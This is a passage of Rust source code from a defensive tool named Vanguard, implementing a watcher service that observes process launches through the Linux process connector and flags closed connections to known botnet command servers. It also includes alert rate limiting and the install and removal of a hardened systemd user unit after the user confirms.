    pub(crate) fn tour(&mut self, attente: Duration) -> Result<Vec<Vu>, i32> {
        let ms = i32::try_from(attente.as_millis()).unwrap_or(1000);
        let pretes = match &self.prises {
            Ok(p) => attendre(&[&self.connecteur, p], ms),
            Err(_) => attendre(&[&self.connecteur], ms),
        };
        let mut vus = Vec::new();
        if pretes[0] {
            self.lire_le_connecteur(&mut vus)?;
        }
        if pretes.get(1).copied().unwrap_or(false)
            && let Ok(prise) = &self.prises
        {
            loop {
                match recevoir(prise, &mut self.tampon) {
                    Recu::Octets(n) => vus.extend(lire_fins_de_prises(&self.tampon[..n]).into_iter().map(Vu::Prise)),
                    Recu::Perdus => vus.push(Vu::Perdus(1)),
                    Recu::Vide => break,
                    Recu::Erreur(e) => return Err(e),
                }
            }
        }
        Ok(vus)
    }

    fn lire_le_connecteur(&mut self, vus: &mut Vec<Vu>) -> Result<(), i32> {
        loop {
            let n = match recevoir(&self.connecteur, &mut self.tampon) {
                Recu::Octets(n) => n,
                Recu::Perdus => {
                    vus.push(Vu::Perdus(1));
                    continue;
                }
                Recu::Vide => return Ok(()),
                Recu::Erreur(e) => return Err(e),
            };
            for e in lire_evenements_proc(&self.tampon[..n]) {
                match e {
                    EvenementProc::Fourche { parent, enfant } => self.table.fourche(parent, enfant, &vivant),
                    EvenementProc::Lancement { pid } => {
                        if let Some(l) = self.lancement(pid) {
                            vus.push(Vu::Lance(l));
                        }
                    }
                    EvenementProc::Fin { pid, .. } => self.table.fin(pid),
                    EvenementProc::Accuse { .. } | EvenementProc::Autre => {}
                }
            }
        }
    }

    fn lancement(&mut self, pid: u32) -> Option<Lance> {
        if !self.lire {
            self.table.lancement(pid, None, false, &vivant);
            return None;
        }
        let maintenant = Instant::now();
        if maintenant.duration_since(self.rafale.0) >= Duration::from_secs(1) {
            self.rafale = (maintenant, 0);
        }
        self.rafale.1 += 1;
        let lecture = if self.rafale.1 > LECTURES_PAR_SECONDE {
            Lecture::NonLu
        } else {
            lire_proc(pid)
        };
        let lu = match &lecture {
            Lecture::Complet(p) | Lecture::NomSeul(p) => Some(p),
            Lecture::Parti | Lecture::NonLu => None,
        };
        let le_mien = lu
            .and_then(|p| p.chemin.as_deref())
            .is_some_and(|c| self.mon_programme.as_deref() == Some(c));
        self.table.lancement(pid, lu, le_mien, &vivant);
        Some(Lance {
            pid,
            parent: lu.and_then(|p| p.parent).or_else(|| self.table.parent(pid)),
            lignee: self.table.lignee(pid),
            de_vanguard: self.table.de_vanguard(pid),
            lecture,
        })
    }
}

impl Drop for Veilleur {
    /// Le désabonnement : sans lui, le noyau compterait un abonné de trop et continuerait de préparer ses messages.
    fn drop(&mut self) {
        let _ = envoyer(
            &self.connecteur,
            &demande_abonnement(PROC_CN_MCAST_IGNORE, jeton_d_abonnement()),
        );
    }
}

// ───────────────────────────── Jugement, sans règle nouvelle ─────────────────────────────

/// Une alerte du veilleur, prête à noter : sa clé (pour ne pas la redire), si elle est grave (notifiée), son genre au
/// tableau de bord, son titre et son texte.
#[derive(Debug, PartialEq, Eq)]
struct Alerte {
    cle: String,
    grave: bool,
    genre: Genre,
    titre: String,
    texte: String,
}

/// Un programme lancé, jugé comme au bilan (COM-PRG-001). Celui qui n'a laissé que son nom court se juge sur ce nom
/// (un outil offensif connu ressort), et c'est dit ; celui qui est parti avant lecture ou n'a pas été lu n'est jamais
/// jugé.
fn juger_lance(l: &Lance) -> Option<Alerte> {
    if l.de_vanguard {
        return None;
    }
    let (p, nom_seul) = match &l.lecture {
        Lecture::Complet(p) => (p, false),
        Lecture::NomSeul(p) => (p, true),
        Lecture::Parti | Lecture::NonLu => return None,
    };
    let s = chasse::juger_programme(p, Os::Linux)?;
    let lignee = l
        .lignee
        .iter()
        .map(|n| crate::ui::affichable(n))
        .collect::<Vec<_>>()
        .join(" → ");
    let nom_seul = if nom_seul {
        tr!(
            " Nom court du noyau seulement (programme terminé avant lecture).",
            " Kernel short name only (program finished before it could be read)."
        )
    } else {
        ""
    };
    Some(Alerte {
        cle: format!("{}|{}", s.raison, p.chemin.as_deref().unwrap_or(&p.nom)),
        grave: s.niveau == Niveau::Eleve,
        genre: Genre::Veilleur,
        titre: tr!(
            "Vanguard : programme suspect lancé",
            "Vanguard: suspicious program started"
        )
        .to_string(),
        texte: trf!(
            "{} ; lignée : {lignee} ; vu au lancement par le veilleur.{nom_seul} Ne rien arrêter à la hâte : vanguard traces garde ses traces, puis Dépanner › Après une infection s'il n'est pas à toi.",
            "{}; lineage: {lignee}; seen at start by the watcher.{nom_seul} Do not stop anything in a hurry: vanguard traces keeps its traces, then Troubleshoot › After an infection if it is not yours.",
            chasse::montrer(p, &s)
        ),
    })
}

/// Une connexion fermée, jugée par les serveurs de commande connus : seulement vers Internet.
fn juger_prise(f: &FinPrise, serveurs: &ServeursDeCommande) -> Option<Alerte> {
    let ip = f.distante.ip().to_canonical();
    if !crate::protection::sortantes::sur_internet(ip) {
        return None;
    }
    let serveur = serveurs.serveur(ip, f.distante.port())?;
    let protocole = match f.protocole {
        Some(17) => "UDP",
        Some(6) => "TCP",
        _ => "TCP/UDP",
    };
    Some(Alerte {
        cle: SocketAddr::new(ip, f.distante.port()).to_string(),
        grave: true,
        genre: Genre::Botnet,
        titre: tr!(
            "Vanguard : connexion brève vers un botnet",
            "Vanguard: brief connection to a botnet"
        )
        .to_string(),
        texte: trf!(
            "{serveur} : connexion {protocole} avec un serveur de commande connu, fermée. Le programme n'est plus connu : le noyau ne le donne pas à la fin d'une connexion. Ouvre « Après une infection » : coupe Internet d'abord.",
            "{serveur}: {protocole} connection with a known command server, closed. The program is no longer known: the kernel does not give it at the end of a connection. Open “After an infection”: cut the Internet first."
        ),
    })
}

// ───────────────────────────── Débit, pur ─────────────────────────────

/// Une même alerte n'est redite qu'après 6 heures.
const REDIRE_APRES: i64 = 6 * 3600;
const DEJA_MAX: usize = 1024;
/// Au journal, au plus 10 alertes par heure et 20 par jour : il en garde 500 en tout (`tableau`), et celles de la
/// surveillance ne doivent pas en être chassées.
const JOURNAL_PAR_HEURE: usize = 10;
const JOURNAL_PAR_JOUR: usize = 20;
/// Au plus 3 notifications par tranche de 10 minutes, et seulement pour le grave.
const NOTIFICATIONS: usize = 3;
const TRANCHE_NOTIFICATIONS: i64 = 600;

#[derive(Debug, PartialEq, Eq)]
enum Decision {
    Noter {
        notifier: bool,
    },
    /// Déjà notée il y a moins de 6 heures.
    Repete,
    /// Au-delà du débit : comptée, puis dite dans le résumé.
    Taire,
}

#[derive(Debug, Default)]
struct Debit {
    deja: HashMap<String, i64>,
    journal: VecDeque<i64>,
    notifications: VecDeque<i64>,
    tues: u32,
    dernier_resume: Option<i64>,
}

impl Debit {
    fn decider(&mut self, cle: &str, grave: bool, maintenant: i64) -> Decision {
        if self
            .deja
            .get(cle)
            .is_some_and(|&quand| maintenant.saturating_sub(quand) < REDIRE_APRES && quand <= maintenant)
        {
            return Decision::Repete;
        }
        if self.deja.len() >= DEJA_MAX && !self.deja.contains_key(cle) {
            self.deja
                .retain(|_, &mut quand| maintenant.saturating_sub(quand) < REDIRE_APRES);
            if self.deja.len() >= DEJA_MAX
                && let Some(plus_vieille) = self.deja.iter().min_by_key(|(_, q)| **q).map(|(c, _)| c.clone())
            {
                self.deja.remove(&plus_vieille);
            }
        }
        self.deja.insert(cle.to_string(), maintenant);
        self.journal.retain(|&q| maintenant.saturating_sub(q) < 24 * 3600);
        let derniere_heure = self
            .journal
            .iter()
            .filter(|&&q| maintenant.saturating_sub(q) < 3600)
            .count();
        if derniere_heure >= JOURNAL_PAR_HEURE || self.journal.len() >= JOURNAL_PAR_JOUR {
            self.tues += 1;
            return Decision::Taire;
        }
        self.journal.push_back(maintenant);
        self.notifications
            .retain(|&q| maintenant.saturating_sub(q) < TRANCHE_NOTIFICATIONS);
        let notifier = grave && self.notifications.len() < NOTIFICATIONS;
        if notifier {
            self.notifications.push_back(maintenant);
        }
        Decision::Noter { notifier }
    }

    /// Le nombre d'alertes tues à dire maintenant, au plus une fois par heure.
    fn resume(&mut self, maintenant: i64) -> Option<u32> {
        if self.tues == 0 || self.dernier_resume.is_some_and(|d| maintenant.saturating_sub(d) < 3600) {
            return None;
        }
        self.dernier_resume = Some(maintenant);
        Some(std::mem::take(&mut self.tues))
    }
}

// ───────────────────────────── État, sur le disque ─────────────────────────────

/// Ce que le service écrit toutes les minutes, et que le bilan et le menu relisent. Aucune ligne de commande n'y va.
#[derive(Debug, Default, Clone, serde::Serialize, serde::Deserialize)]
#[serde(default)]
pub(crate) struct Etat {
    pub pid: u32,
    /// Secondes depuis 1970, comme `battement`.
    pub depuis: i64,
    pub battement: i64,
    pub lancements: u64,
    pub lus: u64,
    pub noms_seuls: u64,
    pub partis: u64,
    pub non_lus: u64,
    pub prises: u64,
    pub perdus: u64,
    pub tus: u64,
    pub tampon: usize,
    /// Les listes de serveurs de commande qui n'ont pas pu servir ; `None` : toutes vérifiées.
    pub listes: Option<String>,
    /// Pourquoi les fins de prises ne s'écoutent pas ; `None` : elles s'écoutent.
    pub sans_prises: Option<String>,
    /// /proc ne montre que les programmes du compte (hidepid) : ceux des autres passent pour partis.
    pub masque: bool,
    pub en_pause: bool,
    pub raison_arret: Option<String>,
    /// Les derniers partis avant lecture : (PID, parent s'il était connu).
    pub derniers_partis: Vec<(u32, Option<u32>)>,
}

const DERNIERS_PARTIS: usize = 10;

fn fichier_etat() -> PathBuf {
    crate::reseau::dossier_local().join("veilleur-etat.json")
}

/// Le choix de la personne, noté à l'allumage : si l'unité disparaît sans qu'elle l'ait coupée, le bilan le dit.
fn fichier_voulu() -> PathBuf {
    crate::reseau::dossier_local().join("veilleur-voulu")
}

pub(crate) fn voulu() -> bool {
    fichier_voulu().is_file()
}

fn lire_etat() -> Option<Etat> {
    let texte = std::fs::read_to_string(fichier_etat()).ok()?;
    serde_json::from_str(&texte).ok()
}

fn ecrire_etat(etat: &Etat) {
    if let Ok(texte) = serde_json::to_string(etat) {
        let _ = crate::reseau::ecrire_atomique(&fichier_etat(), texte);
    }
}

fn maintenant() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| i64::try_from(d.as_secs()).unwrap_or(i64::MAX))
}

/// Le service tourne-t-il vraiment ? Un battement de moins de 3 minutes, et le processus noté est bien le veilleur
/// (un numéro repris par un autre programme ne compte pas).
fn vivant_d_apres(etat: &Etat, maintenant: i64) -> bool {
    let recent = (0..180).contains(&maintenant.saturating_sub(etat.battement));
    recent
        && etat.pid != 0
        && std::fs::read(format!("/proc/{}/cmdline", etat.pid)).is_ok_and(|o| {
            let mots: Vec<&[u8]> = o.split(|&b| b == 0).collect();
            mots.contains(&b"veilleur".as_slice()) && mots.contains(&b"--servir".as_slice())
        })
}

// ───────────────────────────── Le service ─────────────────────────────

/// Le service, au premier plan, lancé par systemd (`vanguard veilleur --servir`). Rend la sortie : 0 à l'arrêt
/// demandé, 1 sur une erreur inattendue (systemd le relance), 77 sur un refus (pas de relance).
fn servir() -> i32 {
    let mut etat = Etat {
        pid: std::process::id(),
        depuis: maintenant(),
        battement: maintenant(),
        ..Etat::default()
    };
    let refuser = |etat: &mut Etat, raison: String| {
        eprintln!("{raison}");
        etat.raison_arret = Some(raison);
        ecrire_etat(etat);
        SORTIE_REFUS
    };
    if root() {
        return refuser(
            &mut etat,
            tr!(
                "Le veilleur ne tourne jamais en root : il se pose pour un compte ordinaire.",
                "The watcher never runs as root: it is set up for an ordinary account."
            )
            .to_string(),
        );
    }
    if let Some(r) = release_du_noyau()
        && noyau_suffisant(&r) == Some(false)
    {
        return refuser(&mut etat, noyau_trop_ancien(&r));
    }
    let mut v = match Veilleur::ouvrir() {
        Ok(v) => v,
        Err(refus) => return refuser(&mut etat, refus.raison()),
    };
    ecouter_les_signaux();
    etat.tampon = v.tampon();
    etat.sans_prises = v.prises.as_ref().err().map(Refus::raison);
    etat.masque = super::dissimulation::proc_masque(&std::fs::read_to_string("/proc/self/mounts").unwrap_or_default());
    let (mut serveurs, absentes) = crate::protection::sortantes::serveurs_gardes();
    etat.listes = (!absentes.is_empty()).then(|| absentes.join(" ; "));
    etat.en_pause = crate::protection::temps_reel::coupure().is_some();
    v.lire = !etat.en_pause;
    ecrire_etat(&etat);
    let mut debit = Debit::default();
    let (mut minute, mut quart) = (Instant::now(), Instant::now());
    let sortie = loop {
        if ARRET.load(Ordering::SeqCst) {
            etat.raison_arret = Some(tr!("arrêt demandé", "stop requested").to_string());
            break 0;
        }
        let vus = match v.tour(Duration::from_secs(1)) {
            Ok(vus) => vus,
            Err(e) => {
                etat.raison_arret = Some(trf!(
                    "erreur de lecture du noyau ({})",
                    "kernel read error ({})",
                    std::io::Error::from_raw_os_error(e)
                ));
                break 1;
            }
        };
        // En pause, ce qui arrive est lu puis jeté : rien n'est noté ni notifié.
        if !etat.en_pause {
            for vu in vus {
                traiter(vu, &mut etat, &mut debit, &serveurs);
            }
            if let Some(n) = debit.resume(maintenant()) {
                tableau::noter_alerte(
                    Genre::Veilleur,
                    tr!(
                        "Vanguard : veilleur, alertes en rafale",
                        "Vanguard: watcher, burst of alerts"
                    ),
                    &trf!(
                        "{n} autre(s) alerte(s) du veilleur non notée(s), pour ne pas inonder le journal : lance « vanguard machine » pour un bilan complet.",
                        "{n} other watcher alert(s) not noted, so as not to flood the log: run “vanguard audit” for a full check."
                    ),
                );
            }
        }
        if minute.elapsed() >= Duration::from_mins(1) {
            minute = Instant::now();
            etat.en_pause = crate::protection::temps_reel::coupure().is_some();
            v.lire = !etat.en_pause;
            etat.battement = maintenant();
            ecrire_etat(&etat);
        }
        if quart.elapsed() >= Duration::from_mins(15) {
            quart = Instant::now();
            let (nouveaux, absentes) = crate::protection::sortantes::serveurs_gardes();
            serveurs = nouveaux;
            etat.listes = (!absentes.is_empty()).then(|| absentes.join(" ; "));
        }
    };
    // Le désabonnement part ici, avant l'état final.
    drop(v);
    etat.battement = maintenant();
    ecrire_etat(&etat);
    sortie
}

/// Un événement vu : compté, puis jugé et noté selon le débit.
fn traiter(vu: Vu, etat: &mut Etat, debit: &mut Debit, serveurs: &ServeursDeCommande) {
    let alerte = match vu {
        Vu::Perdus(n) => {
            etat.perdus += u64::from(n);
            None
        }
        Vu::Prise(f) => {
            etat.prises += 1;
            juger_prise(&f, serveurs)
        }
        Vu::Lance(l) => {
            etat.lancements += 1;
            match &l.lecture {
                Lecture::Complet(_) => etat.lus += 1,
                Lecture::NomSeul(_) => etat.noms_seuls += 1,
                Lecture::NonLu => etat.non_lus += 1,
                Lecture::Parti => {
                    etat.partis += 1;
                    if etat.derniers_partis.len() >= DERNIERS_PARTIS {
                        etat.derniers_partis.remove(0);
                    }
                    etat.derniers_partis.push((l.pid, l.parent));
                }
            }
            juger_lance(&l)
        }
    };
    let Some(a) = alerte else { return };
    match debit.decider(&a.cle, a.grave, maintenant()) {
        Decision::Noter { notifier: true } => crate::reseau::surveillance::alerter(a.genre, &a.titre, &a.texte),
        Decision::Noter { notifier: false } => tableau::noter_alerte(a.genre, &a.titre, &a.texte),
        Decision::Repete => {}
        Decision::Taire => etat.tus += 1,
    }
}

fn noyau_trop_ancien(release: &str) -> String {
    trf!(
        "Linux {} : le veilleur demande Linux 6.6 ou plus récent, le premier qui ouvre le connecteur de processus aux comptes ordinaires. Rien n'est installé.",
        "Linux {}: the watcher needs Linux 6.6 or later, the first to open the process connector to ordinary accounts. Nothing is installed.",
        crate::ui::affichable(release)
    )
}

// ───────────────────────────── L'unité ─────────────────────────────

const MARQUE_FR: &str = "# Posé par Vanguard (vanguard veilleur on)";
const MARQUE_EN: &str = "# Placed by Vanguard (vanguard watcher on)";

fn fichier_unite() -> PathBuf {
    PathBuf::from(std::env::var_os("HOME").unwrap_or_default())
        .join(".config/systemd/user")
        .join(UNITE)
}

/// Le texte de l'unité, dans la langue demandée. Le chemin entre guillemets (un dossier personnel peut contenir une
/// espace), « % » doublé (spécificateurs de systemd), comme la surveillance.
fn unite_dans(exe: &str, anglais: bool) -> String {
    let exe = format!("\"{}\"", exe.replace('%', "%%").replace('"', "\\\""));
    // Le durcissement : ce qui garde l'accusé du connecteur dans une unité de l'utilisateur (mesuré une option à la
    // fois puis toutes ensemble). Sans Nice : plus le veilleur est servi tard, plus un programme bref part avant
    // d'être lu.
    let durcissement = "Restart=on-failure\nRestartSec=30s\n";
    let limites = "RestartPreventExitStatus=77\nCPUQuota=20%\nMemoryMax=128M\nTasksMax=16\nUMask=0077\n\
                   NoNewPrivileges=yes\nLockPersonality=yes\nMemoryDenyWriteExecute=yes\nRestrictRealtime=yes\n\
                   RestrictSUIDSGID=yes\nRestrictNamespaces=yes\nSystemCallArchitectures=native\n\
                   SystemCallFilter=@system-service\nRestrictAddressFamilies=AF_UNIX AF_NETLINK\n";
    if anglais {
        format!(
            "{MARQUE_EN};\n# “vanguard watcher off” removes it.\n[Unit]\nDescription=Vanguard: watcher (observes, stops nothing)\nStartLimitIntervalSec=1h\nStartLimitBurst=5\n\n[Service]\nType=simple\nExecStart={exe} veilleur --servir\n# One tokio worker: one per core would exceed TasksMax.\nEnvironment=TOKIO_WORKER_THREADS=1\n{durcissement}# 77: kernel too old or kernel refusal; a restart changes nothing.\n{limites}# No ProtectSystem, ProtectHome, PrivateTmp, ReadOnlyPaths,\n# ReadWritePaths, ProtectKernel*, ProtectControlGroups, PrivateDevices\n# or PrivateUsers: in a user unit, they create a user namespace where\n# the kernel ignores the connector subscription (measured: no ack).\n# No Nice: the later the watcher runs, the more a brief program is gone\n# before it is read.\n\n[Install]\nWantedBy=default.target\n"
        )
    } else {
        format!(
            "{MARQUE_FR} ;\n# « vanguard veilleur off » le retire.\n[Unit]\nDescription=Vanguard : veilleur (observe, n'arrête rien)\nStartLimitIntervalSec=1h\nStartLimitBurst=5\n\n[Service]\nType=simple\nExecStart={exe} veilleur --servir\n# Un seul fil de travail pour tokio : un par cœur dépasserait TasksMax.\nEnvironment=TOKIO_WORKER_THREADS=1\n{durcissement}# 77 : noyau trop ancien ou refus du noyau ; relancer n'y change rien.\n{limites}# Ni ProtectSystem, ProtectHome, PrivateTmp, ReadOnlyPaths,\n# ReadWritePaths, ProtectKernel*, ProtectControlGroups, PrivateDevices\n# ni PrivateUsers : dans une unité de l'utilisateur, ils créent un\n# espace de noms d'utilisateur où le noyau ignore l'abonnement au\n# connecteur (mesuré : plus d'accusé).\n# Pas de Nice : plus le veilleur est servi tard, plus un programme bref\n# part avant d'être lu.\n\n[Install]\nWantedBy=default.target\n"
        )
    }
}

fn unite(exe: &str) -> String {
    unite_dans(exe, crate::langue::anglais())
}

/// Est-ce l'unité de Vanguard ? Sa première ligne est notre marque, dans l'une ou l'autre langue : une unité du même
/// nom posée par quelqu'un d'autre n'est jamais effacée.
fn notre_unite(texte: &str) -> bool {
    texte
        .lines()
        .next()
        .is_some_and(|l| l.starts_with(MARQUE_FR) || l.starts_with(MARQUE_EN))
}

/// Le programme que l'unité lancera : la copie locale si Vanguard tourne depuis la clé (`surveillance::executable`
/// la fait, mais seulement après l'accord).
fn exe_prevu() -> Option<String> {
    let exe = crate::protection::cle::exe_d_origine()?;
    if crate::reseau::cle_usb().is_some_and(|cle| exe.starts_with(&cle)) {
        let dest = crate::reseau::dossier_local()
            .join("bin")
            .join(exe.file_name().unwrap_or_default());
        return Some(dest.display().to_string());
    }
    Some(exe.display().to_string())
}

fn systemctl(args: &[&str]) -> bool {
    crate::reseau::surveillance::reussit("systemctl", args)
}

fn explication() -> &'static str {
    tr!(
        "Le veilleur voit chaque programme lancé sur cet ordinateur, de tous les comptes, même s'il ne vit que quelques millisecondes, et chaque connexion TCP ou UDP au moment où elle se ferme. Il les juge comme le bilan (outil offensif connu, commande qui télécharge ou cache ce qu'elle lance) et contre les serveurs de commande de botnets déjà téléchargés par la surveillance ou le bilan. Il n'arrête rien, n'envoie rien, et ne garde que les alertes, au tableau de bord (vanguard tableau). Un programme parti avant d'être lu est compté tel quel, jamais jugé sain ; le programme d'une connexion fermée n'est pas connu (le noyau ne le donne pas). Il tourne pendant ta session ouverte, sans droits d'administrateur ni code chargé dans le noyau.",
        "The watcher sees each program started on this computer, from every account, even one that lives only a few milliseconds, and each TCP or UDP connection as it closes. It judges them as the check does (known offensive tool, command that downloads or hides what it runs) and against the botnet command servers already downloaded by the monitoring or the check. It stops nothing, sends nothing, and keeps only the alerts, on the dashboard (vanguard dashboard). A program gone before it could be read is counted as such, never judged safe; the program of a closed connection is not known (the kernel does not give it). It runs while your session is open, without administrator rights or code loaded into the kernel."
    )
}

fn allumer() {
    if root() {
        trp!(
            "  ✖ En root, rien n'est posé : le veilleur se pose pour ton compte. Relance sans sudo.",
            "  ✖ As root, nothing is set up: the watcher is set up for your account. Run it again without sudo."
        );
        return;
    }
    if let Some(r) = release_du_noyau()
        && noyau_suffisant(&r) == Some(false)
    {
        trp!("  ✖ {}", "  ✖ {}", noyau_trop_ancien(&r));
        return;
    }
    // L'essai sur le vrai noyau, 2 secondes au plus : ce qui ne s'ouvre pas ici ne s'ouvrira pas dans l'unité.
    if let Err(refus) = Veilleur::ouvrir() {
        trp!("  ✖ {}", "  ✖ {}", refus.raison());
        return;
    }
    if crate::machine::linux::natif::unite_activee(UNITE, true).is_none() {
        trp!(
            "  ✖ systemd de l'utilisateur introuvable : le veilleur est un de ses services. Rien n'est installé.",
            "  ✖ User systemd not found: the watcher is one of its services. Nothing is installed."
        );
        return;
    }
    let Some(exe) = exe_prevu().filter(|e| !e.contains(['\n', '\r'])) else {
        trp!(
            "  ✖ Le chemin de Vanguard ne se lit pas : rien n'est installé.",
            "  ✖ Vanguard's path cannot be read: nothing is installed."
        );
        return;
    };
    let chemin = fichier_unite();
    let texte = unite(&exe);
    afficher_aligne("  ", explication(), 2, "");
    println!();
    trp!(
        "  Voici l'unité posée : {}",
        "  Here is the unit that will be set up: {}",
        crate::ui::chemin_affichable(&chemin)
    );
    for l in texte.lines() {
        println!("    {GRIS}{}{RESET}", crate::ui::affichable(l));
    }
    crate::protection::temps_reel::dire_si_coupee(crate::protection::temps_reel::Ou::Surveillance);
    if !demander(tr!(
        "\n  Allumer le veilleur ? [o/N] : ",
        "\n  Turn the watcher on? [y/N]: "
    ))
    .oui()
    {
        trp!("  Rien n'est posé.", "  Nothing is set up.");
        return;
    }
    // La copie locale (Vanguard lancé depuis la clé) se fait maintenant, après l'accord ; un autre chemin que celui
    // montré, et rien n'est posé.
    let reel = crate::reseau::surveillance::executable();
    if reel != exe {
        trp!(
            "  ✖ La copie locale de Vanguard n'a pas pu se faire ({}) : rien n'est posé.",
            "  ✖ The local copy of Vanguard could not be made ({}): nothing is set up.",
            crate::ui::affichable(&exe)
        );
        return;
    }
    let ecrit =
        chemin.parent().is_some_and(|d| std::fs::create_dir_all(d).is_ok()) && std::fs::write(&chemin, &texte).is_ok();
    let reussi = ecrit && systemctl(&["--user", "daemon-reload"]) && systemctl(&["--user", "enable", "--now", UNITE]);
    crate::changements::noter(
        &[vec![
            format!("{} → {}", tr!("écrire", "write"), chemin.display()),
            "systemctl --user daemon-reload".to_string(),
            format!("systemctl --user enable --now {UNITE}"),
        ]],
        &[reussi],
    );
    if !reussi {
        trp!(
            "  ✖ Le veilleur n'a pas pu être allumé (journalctl --user -u {UNITE} dit pourquoi).",
            "  ✖ The watcher could not be turned on (journalctl --user -u {UNITE} tells why)."
        );
        return;
    }
    if let Some(d) = fichier_voulu().parent() {
        let _ = std::fs::create_dir_all(d);
    }
    let _ = std::fs::write(fichier_voulu(), b"");
    std::thread::sleep(Duration::from_secs(3));
    if lire_etat().is_some_and(|e| vivant_d_apres(&e, maintenant()) && e.raison_arret.is_none()) {
        trp!(
            "  {VERT}✔{RESET} Veilleur allumé : ses alertes vont au tableau de bord (vanguard tableau), le grave en notification.",
            "  {VERT}✔{RESET} Watcher on: its alerts go to the dashboard (vanguard dashboard), what is serious as a notification."
        );
    } else {
        trp!(
            "  ⚠ Veilleur posé, pas encore vu en marche : « vanguard veilleur » le redit dans un instant ; journalctl --user -u {UNITE} dit pourquoi.",
            "  ⚠ Watcher set up, not seen running yet: “vanguard watcher” tells again in a moment; journalctl --user -u {UNITE} tells why."
        );
    }
}

fn couper() {
    let chemin = fichier_unite();
    let texte = std::fs::read_to_string(&chemin).ok();
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true) == Some(true);
    if texte.is_none() && !activee && !voulu() {
        trp!(
            "  {VERT}✔{RESET} Le veilleur est déjà coupé : rien à retirer.",
            "  {VERT}✔{RESET} The watcher is already off: nothing to remove."
        );
        let _ = std::fs::remove_file(fichier_etat());
        return;
    }
    let a_nous = texte.as_deref().is_some_and(notre_unite);
    trp!(
        "  Le veilleur s'arrête (systemctl --user disable --now {UNITE}).",
        "  The watcher stops (systemctl --user disable --now {UNITE})."
    );
    match (&texte, a_nous) {
        (Some(_), true) => trp!(
            "  Son unité est retirée : {}",
            "  Its unit is removed: {}",
            crate::ui::chemin_affichable(&chemin)
        ),
        (Some(_), false) => trp!(
            "  Une unité de ce nom existe, mais Vanguard ne l'a pas posée : arrêtée, elle reste en place ({}).",
            "  A unit of that name exists, but Vanguard did not set it up: stopped, it stays in place ({}).",
            crate::ui::chemin_affichable(&chemin)
        ),
        (None, _) => {}
    }
    if !demander(tr!(
        "\n  Couper le veilleur ? [o/N] : ",
        "\n  Turn the watcher off? [y/N]: "
    ))
    .oui()
    {
        trp!("  Rien n'est changé.", "  Nothing is changed.");
        return;
    }
    let arrete = systemctl(&["--user", "disable", "--now", UNITE]);
    let mut commandes = vec![format!("systemctl --user disable --now {UNITE}")];
    let retiree = if a_nous {
        commandes.push(format!("{} {}", tr!("retirer", "remove"), chemin.display()));
        std::fs::remove_file(&chemin).is_ok()
    } else {
        true
    };
    commandes.push("systemctl --user daemon-reload".to_string());
    let recharge = systemctl(&["--user", "daemon-reload"]);
    let _ = std::fs::remove_file(fichier_voulu());
    let _ = std::fs::remove_file(fichier_etat());
    // Une unité absente rend disable en échec sans que rien ne tourne : le résultat qui compte est l'unité retirée et
    // plus activée.
    let reussi =
        retiree && recharge && (arrete || crate::machine::linux::natif::unite_activee(UNITE, true) != Some(true));
    crate::changements::noter(&[commandes], &[reussi]);
    if reussi {
        trp!("  {VERT}✔{RESET} Veilleur coupé.", "  {VERT}✔{RESET} Watcher off.");
    } else {
        trp!(
            "  ✖ Le veilleur n'a pas pu être coupé entièrement : systemctl --user status {UNITE} dit où il en est.",
            "  ✖ The watcher could not be turned off completely: systemctl --user status {UNITE} tells where it stands."
        );
    }
}

// ───────────────────────────── Commande, menu, bilan ─────────────────────────────

/// `vanguard veilleur [on|off]`, et le service lui-même (`--servir`).
pub(crate) fn commande(etat: Option<&str>, servir: bool) {
    if servir {
        std::process::exit(self::servir());
    }
    titre(tr!(
        "Veilleur : lancements et connexions",
        "Watcher: launches and connections"
    ));
    match etat {
        Some("on") => allumer(),
        Some("off") => couper(),
        _ => {
            let c = constat();
            let signe = match c.probleme {
                None => format!("{VERT}✔{RESET} "),
                Some(n) => format!("{}⚠{RESET} ", couleur(n)),
            };
            afficher_aligne(&format!("  {signe}"), &c.message, 4, "");
            // La proposition inverse, seulement à quelqu'un qui peut répondre.
            if std::io::stdin().is_terminal() {
                println!();
                if crate::machine::linux::natif::unite_activee(UNITE, true) == Some(true) {
                    couper();
                } else {
                    allumer();
                }
            }
        }
    }
}

fn precision_de(activee: Option<bool>, vivant: bool, pause: bool) -> &'static str {
    match (activee, vivant, pause) {
        (Some(true), true, true) => tr!("allumé, en pause (temps réel)", "on, paused (real-time off)"),
        (Some(true), true, false) => tr!("allumé", "on"),
        (Some(true), false, _) => tr!("allumé, à l'arrêt", "on, stopped"),
        _ => tr!("coupé", "off"),
    }
}

/// La précision de la ligne du menu : des fichiers lus, rien de lancé.
pub(crate) fn precision() -> &'static str {
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true);
    let vivant = lire_etat().is_some_and(|e| vivant_d_apres(&e, maintenant()));
    precision_de(activee, vivant, crate::protection::temps_reel::coupure().is_some())
}

/// Le constat du bilan.
fn constat() -> Constat {
    let activee = crate::machine::linux::natif::unite_activee(UNITE, true);
    let etat = lire_etat();
    let maintenant = maintenant();
    let vivant = etat.as_ref().is_some_and(|e| vivant_d_apres(e, maintenant));
    let mut voulu = voulu();
    // Allumé sans la marque (un dossier de Vanguard refait) : le choix est noté, sa disparition se verra.
    if activee == Some(true) && !voulu {
        let _ = std::fs::write(fichier_voulu(), b"");
        voulu = true;
    }
    let noyau = release_du_noyau().and_then(|r| noyau_suffisant(&r));
    juger_etat(voulu, activee, etat.as_ref(), vivant, noyau)
}

fn date(ts: i64) -> String {
    chrono::DateTime::from_timestamp(ts, 0).map_or_else(String::new, |d| {
        d.with_timezone(&chrono::Local).format("%d/%m %H:%M").to_string()
    })
}

/// L'état du veilleur au bilan, d'après ce qui a été lu : marque du choix, unité activée (`None` : pas de systemd de
/// l'utilisateur), état écrit par le service, service vivant, noyau assez récent.
fn juger_etat(voulu: bool, activee: Option<bool>, etat: Option<&Etat>, vivant: bool, noyau: Option<bool>) -> Constat {
    const CAT: &str = "Surveillance";
    let Some(activee) = activee else {
        return impossible(
            CAT,
            tr!(
                "veilleur : systemd de l'utilisateur introuvable",
                "watcher: user systemd not found"
            ),
        );
    };
    match (activee, voulu, etat.filter(|_| vivant)) {
        (false, false, _) => {
            let mut texte = tr!(
                "Veilleur des lancements et des connexions : coupé, comme par défaut ; « vanguard veilleur on » l'allume (Linux 6.6 et plus).",
                "Watcher of launches and connections: off, as by default; “vanguard watcher on” turns it on (Linux 6.6 and later)."
            )
            .to_string();
            if noyau == Some(false) {
                texte.push(' ');
                texte.push_str(tr!(
